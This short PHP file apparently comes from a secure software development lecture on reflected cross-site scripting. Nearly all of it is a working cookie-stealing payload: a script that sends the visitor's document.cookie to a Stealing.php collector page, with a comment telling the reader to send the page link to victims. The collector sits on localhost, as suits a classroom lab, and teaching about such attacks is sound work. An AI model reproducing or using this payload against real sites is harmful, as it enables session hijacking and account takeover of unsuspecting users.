<?php
/**
 * Created by PhpStorm.
 * User: wsan
 * Date: 18.11.2014
 * Time: 03:11
 */

// Send the link of this page to victims
?>
<script>
var img = new Image();
img.src="http://localhost/SecureSoftwareDevelopment/Lecture4/2XSS/2ReflectedXSS/Stealing.php?cookie=" + document.cookie;
</script>

